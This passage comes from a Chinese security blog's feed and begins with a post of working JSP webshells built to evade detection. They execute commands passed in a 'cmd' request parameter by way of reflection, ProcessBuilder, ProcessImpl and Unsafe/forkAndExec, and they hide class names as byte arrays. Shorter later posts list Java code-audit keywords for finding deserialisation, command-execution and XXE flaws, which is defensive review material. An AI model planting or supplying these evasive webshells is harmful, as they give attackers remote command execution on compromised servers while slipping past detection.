class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br><br>&lt;%<br>    String str = request.getParameter(<span class="hljs-string">&quot;str&quot;</span>);<br><br>    // 定义<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>字符串变量<br>    String rt = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);<br><br>    // 反射java.lang.Runtime类获取Class对象<br>    Class&lt;?&gt; c = Class.forName(rt);<br><br>    // 反射获取Runtime类的getRuntime方法<br>    Method m1 = c.getMethod(new String(new byte[]&#123;103, 101, 116, 82, 117, 110, 116, 105, 109, 101&#125;));<br><br>    // 反射获取Runtime类的<span class="hljs-built_in">exec</span>方法<br>    Method m2 = c.getMethod(new String(new byte[]&#123;101, 120, 101, 99&#125;), String.class);<br><br>    // 反射调用Runtime.getRuntime().<span class="hljs-built_in">exec</span>(xxx)方法<br>    Object obj2 = m2.invoke(m1.invoke(null, new Object[]&#123;&#125;), new Object[]&#123;str&#125;);<br><br>    // 反射获取Process类的getInputStream方法<br>    Method m = obj2.getClass().getMethod(new String(new byte[]&#123;103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109&#125;));<br>    m.setAccessible(<span class="hljs-literal">true</span>);<br><br>    // 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串<br>    Scanner s = new Scanner((InputStream) m.invoke(obj2, new Object[]&#123;&#125;)).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    String result = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br><br>    // 输出命令执行结果<br>    out.println(result);<br>%&gt;<br></code></pre></div></td></tr></table></figure><h1 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a>ProcessBuilder命令执行</h1><p><code>1.jsp?cmd=/bin/sh&amp;cmd=-c&amp;cmd=cd /Users/;ls -la</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream <span class="hljs-keyword">in</span> = new ProcessBuilder(request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>)).start().getInputStream();<br>    ByteArrayOutputStream baos = new ByteArrayOutputStream();<br>    byte[] b = new byte[1024];<br>    int a = -1;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -1) &#123;<br>        baos.write(b, 0, a);<br>    &#125;<br><br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + new String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></div></td></tr></table></figure><h1 id="反射加载UNIXProcess-ProcessImpl"><a href="#反射加载UNIXProcess-ProcessImpl" class="headerlink" title="反射加载UNIXProcess/ProcessImpl"></a>反射加载UNIXProcess/ProcessImpl</h1><p><code>1.jsp?cmd=whoami</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br><br>&lt;%!<br>    byte[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == null) &#123;<br>            <span class="hljs-built_in">return</span> null;<br>        &#125;<br><br>        byte[] bytes  = s.getBytes();<br>        byte[] result = new byte[bytes.length + 1];<br>        System.arraycopy(bytes, 0, result, 0, bytes.length);<br>        result[result.length - 1] = (byte) 0;<br>        <span class="hljs-built_in">return</span> result;<br>    &#125;<br><br>    InputStream start(String[] strs) throws Exception &#123;<br>        // java.lang.UNIXProcess<br>        String unixClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115&#125;);<br><br>        // java.lang.ProcessImpl<br>        String processClass = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108&#125;);<br><br>        Class clazz = null;<br><br>        // 反射创建UNIXProcess或者ProcessImpl<br>        try &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; catch (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br><br>        // 获取UNIXProcess或者ProcessImpl的构造方法<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[0];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        assert strs != null &amp;&amp; strs.length &gt; 0;<br><br>        // Convert arguments to a contiguous block; it<span class="hljs-string">&#x27;s easier to do</span><br><span class="hljs-string">        // memory management in Java than in C.</span><br><span class="hljs-string">        byte[][] args = new byte[strs.length - 1][];</span><br><span class="hljs-string"></span><br><span class="hljs-string">        int size = args.length; // For added NUL bytes</span><br><span class="hljs-string">        for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="hljs-string">            args[i] = strs[i + 1].getBytes();</span><br><span class="hljs-string">            size += args[i].length;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        byte[] argBlock = new byte[size];</span><br><span class="hljs-string">        int    i        = 0;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        for (byte[] arg : args) &#123;</span><br><span class="hljs-string">            System.arraycopy(arg, 0, argBlock, i, arg.length);</span><br><span class="hljs-string">            i += arg.length + 1;</span><br><span class="hljs-string">            // No need to write NUL bytes explicitly</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        int[] envc    = new int[1];</span><br><span class="hljs-string">        int[] std_fds = new int[]&#123;-1, -1, -1&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        FileInputStream  f0 = null;</span><br><span class="hljs-string">        FileOutputStream f1 = null;</span><br><span class="hljs-string">        FileOutputStream f2 = null;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // In theory, close() can throw IOException</span><br><span class="hljs-string">        // (although it is rather unlikely to happen here)</span><br><span class="hljs-string">        try &#123;</span><br><span class="hljs-string">            if (f0 != null) f0.close();</span><br><span class="hljs-string">        &#125; finally &#123;</span><br><span class="hljs-string">            try &#123;</span><br><span class="hljs-string">                if (f1 != null) f1.close();</span><br><span class="hljs-string">            &#125; finally &#123;</span><br><span class="hljs-string">                if (f2 != null) f2.close();</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // 创建UNIXProcess或者ProcessImpl实例</span><br><span class="hljs-string">        Object object = constructor.newInstance(</span><br><span class="hljs-string">                toCString(strs[0]), argBlock, args.length,</span><br><span class="hljs-string">                null, envc[0], null, std_fds, false</span><br><span class="hljs-string">        );</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // 获取命令执行的InputStream</span><br><span class="hljs-string">        Method inMethod = object.getClass().getDeclaredMethod(&quot;getInputStream&quot;);</span><br><span class="hljs-string">        inMethod.setAccessible(true);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        return (InputStream) inMethod.invoke(object);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    String inputStreamToString(InputStream in, String charset) throws IOException &#123;</span><br><span class="hljs-string">        try &#123;</span><br><span class="hljs-string">            if (charset == null) &#123;</span><br><span class="hljs-string">                charset = &quot;UTF-8&quot;;</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            ByteArrayOutputStream out = new ByteArrayOutputStream();</span><br><span class="hljs-string">            int                   a   = 0;</span><br><span class="hljs-string">            byte[]                b   = new byte[1024];</span><br><span class="hljs-string"></span><br><span class="hljs-string">            while ((a = in.read(b)) != -1) &#123;</span><br><span class="hljs-string">                out.write(b, 0, a);</span><br><span class="hljs-string">            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            return new String(out.toByteArray());</span><br><span class="hljs-string">        &#125; catch (IOException e) &#123;</span><br><span class="hljs-string">            throw e;</span><br><span class="hljs-string">        &#125; finally &#123;</span><br><span class="hljs-string">            if (in != null)</span><br><span class="hljs-string">                in.close();</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">%&gt;</span><br><span class="hljs-string">&lt;%</span><br><span class="hljs-string">    String[] str = request.getParameterValues(&quot;cmd&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if (str != null) &#123;</span><br><span class="hljs-string">        InputStream in     = start(str);</span><br><span class="hljs-string">        String      result = inputStreamToString(in, &quot;UTF-8&quot;);</span><br><span class="hljs-string">        out.println(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-string">        out.println(result);</span><br><span class="hljs-string">        out.println(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-string">        out.flush();</span><br><span class="hljs-string">        out.close();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">%&gt;</span><br></code></pre></div></td></tr></table></figure><h1 id="forkAndExec命令执行-Unsafe-反射-Native方法调用"><a href="#forkAndExec命令执行-Unsafe-反射-Native方法调用" class="headerlink" title="forkAndExec命令执行-Unsafe+反射+Native方法调用"></a>forkAndExec命令执行-Unsafe+反射+Native方法调用</h1><p><code>1.jsp?cmd=whoami</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    byte[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == null)<br>            <span class="hljs-built_in">return</span> null;<br>        byte[] bytes  = s.getBytes();<br>        byte[] result = new byte[bytes.length + 1];<br>        System.arraycopy(bytes, 0,<br>                result, 0,<br>                bytes.length);<br>        result[result.length - 1] = (byte) 0;<br>        <span class="hljs-built_in">return</span> result;<br>    &#125;<br><br><br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (strs != null) &#123;<br>        Field theUnsafeField = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);<br><br>        Class processClass = null;<br><br>        try &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; catch (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br><br>        Object processObject = unsafe.allocateInstance(processClass);<br><br>        // Convert arguments to a contiguous block; it<span class="hljs-string">&#x27;s easier to do</span><br><span class="hljs-string">        // memory management in Java than in C.</span><br><span class="hljs-string">        byte[][] args = new byte[strs.length - 1][];</span><br><span class="hljs-string">        int      size = args.length; // For added NUL bytes</span><br><span class="hljs-string"></span><br><span class="hljs-string">        for (int i = 0; i &lt; args.length; i++) &#123;</span><br><span class="hljs-string">            args[i] = strs[i + 1].getBytes();</span><br><span class="hljs-string">            size += args[i].length;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        byte[] argBlock = new byte[size];</span><br><span class="hljs-string">        int    i        = 0;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        for (byte[] arg : args) &#123;</span><br><span class="hljs-string">            System.arraycopy(arg, 0, argBlock, i, arg.length);</span><br><span class="hljs-string">            i += arg.length + 1;</span><br><span class="hljs-string">            // No need to write NUL bytes explicitly</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        int[] envc                 = new int[1];</span><br><span class="hljs-string">        int[] std_fds              = new int[]&#123;-1, -1, -1&#125;;</span><br><span class="hljs-string">        Field launchMechanismField = processClass.getDeclaredField(&quot;launchMechanism&quot;);</span><br><span class="hljs-string">        Field helperpathField      = processClass.getDeclaredField(&quot;helperpath&quot;);</span><br><span class="hljs-string">        launchMechanismField.setAccessible(true);</span><br><span class="hljs-string">        helperpathField.setAccessible(true);</span><br><span class="hljs-string">        Object launchMechanismObject = launchMechanismField.get(processObject);</span><br><span class="hljs-string">        byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        int ordinal = (int) launchMechanismObject.getClass().getMethod(&quot;ordinal&quot;).invoke(launchMechanismObject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        Method forkMethod = processClass.getDeclaredMethod(&quot;forkAndExec&quot;, new Class[]&#123;</span><br><span class="hljs-string">                int.class, byte[].class, byte[].class, byte[].class, int.class,</span><br><span class="hljs-string">                byte[].class, int.class, byte[].class, int[].class, boolean.class</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        forkMethod.setAccessible(true);// 设置访问权限</span><br><span class="hljs-string"></span><br><span class="hljs-string">        int pid = (int) forkMethod.invoke(processObject, new Object[]&#123;</span><br><span class="hljs-string">                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,</span><br><span class="hljs-string">                null, envc[0], null, std_fds, false</span><br><span class="hljs-string">        &#125;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span><br><span class="hljs-string">        Method initStreamsMethod = processClass.getDeclaredMethod(&quot;initStreams&quot;, int[].class);</span><br><span class="hljs-string">        initStreamsMethod.setAccessible(true);</span><br><span class="hljs-string">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        // 获取本地执行结果的输入流</span><br><span class="hljs-string">        Method getInputStreamMethod = processClass.getMethod(&quot;getInputStream&quot;);</span><br><span class="hljs-string">        getInputStreamMethod.setAccessible(true);</span><br><span class="hljs-string">        InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-string">        int                   a    = 0;</span><br><span class="hljs-string">        byte[]                b    = new byte[1024];</span><br><span class="hljs-string"></span><br><span class="hljs-string">        while ((a = in.read(b)) != -1) &#123;</span><br><span class="hljs-string">            baos.write(b, 0, a);</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        out.println(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-string">        out.println(baos.toString());</span><br><span class="hljs-string">        out.println(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-string">        out.flush();</span><br><span class="hljs-string">        out.close();</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">%&gt;</span><br></code></pre></div></td></tr></table></figure><p><a href="https://github.com/Ch1ngg/JCE" title="JCE">webshell免杀项目</a></p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jsp马</tag>
      
      <tag>webshell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>.getBean(&quot;&quot;) .callMethod(&quot;&quot;)的思路</title>
    <link href="/2021/01/12/47/"/>
    <url>/2021/01/12/47/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">CallMethodService service = ContextUtil.getBean(<span class="hljs-string">&quot;aiasset-obsoleteservice&quot;</span>);<br>JSONObject json = service.callMethod(<span class="hljs-string">&quot;exportObsoleteResmDetail&quot;</span>, pagequery) ;<br></code></pre></div></td></tr></table></figure><p>相当于</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Obsoleteservice service = <span class="hljs-keyword">new</span> Obsoleteservice();<br>JSONObject json = service.exportObsoleteResmDetail(pagequery);<br></code></pre></div></td></tr></table></figure><p>再碰到此类问题的时候就跟进obsoleteservice类的exportObsoleteResmDetail方法，往下就是跟springMVC的跟进思路相同</p><p>为什么要这样写不直接new呢，问了一下同事说是因为直接new的话只能调用当前模块的类，而第一个写法可以跨模块获取</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java审计</tag>
      
      <tag>审计思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java代码审计关键字讲解</title>
    <link href="/2020/12/24/46/"/>
    <url>/2020/12/24/46/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">json.parseObject<br>JSONObject.parseObject<br><span class="hljs-meta">@RequestBody</span><br></code></pre></div></td></tr></table></figure><h1 id="其他反序列化"><a href="#其他反序列化" class="headerlink" title="其他反序列化"></a>其他反序列化</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">request.getinputstream<br>ObjectInputStream<br>.readObject()<br>deserialize<br>Serialize<br><span class="hljs-meta">@RequestBody</span><br>ObjectInputStream.readUnshared<br>XMLDecoder.readObject<br>Yaml.load<br>XStream.fromXML<br>ObjectMapper.readValue<br></code></pre></div></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">/upload<br>/file<br>/save<br>/add<br></code></pre></div></td></tr></table></figure><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Runtime.getRuntime().exec<br><span class="hljs-keyword">case</span> shell<br>ShellProcessor<br>processor<br></code></pre></div></td></tr></table></figure><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">order by<br>= <span class="hljs-string">&#x27;&quot;+</span><br><span class="hljs-string">query（queryList）</span><br><span class="hljs-string">like &quot;%</span><br><span class="hljs-string">.call</span><br><span class="hljs-string">$&#123;</span><br></code></pre></div></td></tr></table></figure><h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">/down<br>/file<br>/export<br>/file<br></code></pre></div></td></tr></table></figure><h1 id="越权（信息泄露）"><a href="#越权（信息泄露）" class="headerlink" title="越权（信息泄露）"></a>越权（信息泄露）</h1><p>直接看业务逻辑，看有无对登陆/权限的校验</p><h1 id="目录遍历-ssrf"><a href="#目录遍历-ssrf" class="headerlink" title="目录遍历/ssrf"></a>目录遍历/ssrf</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-string">&quot;url&quot;</span><br>filepath<br>fileurlpath<br></code></pre></div></td></tr></table></figure><h1 id="文件包含（jsp文件）"><a href="#文件包含（jsp文件）" class="headerlink" title="文件包含（jsp文件）"></a>文件包含（jsp文件）</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">include<br></code></pre></div></td></tr></table></figure><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">parseX<br>parseT<br></code></pre></div></td></tr></table></figure><h2 id="引用的接口："><a href="#引用的接口：" class="headerlink" title="引用的接口："></a>引用的接口：</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.xml.parsers.DocumentBuilder<br>javax.xml.stream.XMLInputFactoryr<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader <br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource <br>javax.xml.transform.TransformerFactory <br>javax.xml.transform.sax.SAXTransformerFactory <br>javax.xml.validation.SchemaFactory<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XPathExpression<br></code></pre></div></td></tr></table></figure><h2 id="修复写法："><a href="#修复写法：" class="headerlink" title="修复写法："></a>修复写法：</h2><h3 id="javax-xml-parsers-DocumentBuilder"><a href="#javax-xml-parsers-DocumentBuilder" class="headerlink" title="javax.xml.parsers.DocumentBuilder"></a><code>javax.xml.parsers.DocumentBuilder</code></h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs 